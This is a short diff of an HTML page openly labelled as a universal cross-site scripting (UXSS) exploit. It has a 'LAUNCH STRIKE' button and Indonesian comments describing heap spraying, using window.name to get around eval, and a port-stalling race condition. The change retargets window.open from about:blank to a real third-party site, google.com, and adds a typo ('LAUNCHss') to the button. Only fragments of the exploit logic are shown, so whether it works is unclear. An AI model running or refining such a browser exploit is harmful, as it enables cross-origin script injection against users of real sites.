@@ -8,7 +8,7 @@
     <div style="padding:50px; border:10px solid #f00; background:#100; box-shadow:0 0 100px #f00;">
         <h1 style="font-size:4em;">☢️ UXSS_FINAL_EXPLOIT ☢️</h1>
         <p id="status" style="font-size:1.5em; color:#0f0;">> READY_TO_DETONATE</p>
-        <button id="launch" style="padding:50px 100px; font-size:3em; background:#f00; color:#000; font-weight:bold; cursor:pointer; border:none; border-radius:20px;">LAUNCH STRIKE</button>
+        <button id="launch" style="padding:50px 100px; font-size:3em; background:#f00; color:#000; font-weight:bold; cursor:pointer; border:none; border-radius:20px;">LAUNCHss STRIKE</button>
     </div>
 
 <script>
@@ -52,7 +52,7 @@
         log("INITIATING HEAP_SPRAY...");
         
         // window.name digunakan untuk bypass 'eval' (sinkronisasi payload)
-        let targetWindow = window.open("about:blank", blobURL);
+    let targetWindow = window.open("https://www.google.com", blobURL);
 
         // STAGE 1: PORT STALLING (Menciptakan kondisi 'Race')
         // Kita navigasi ke port yang akan hang (9090)
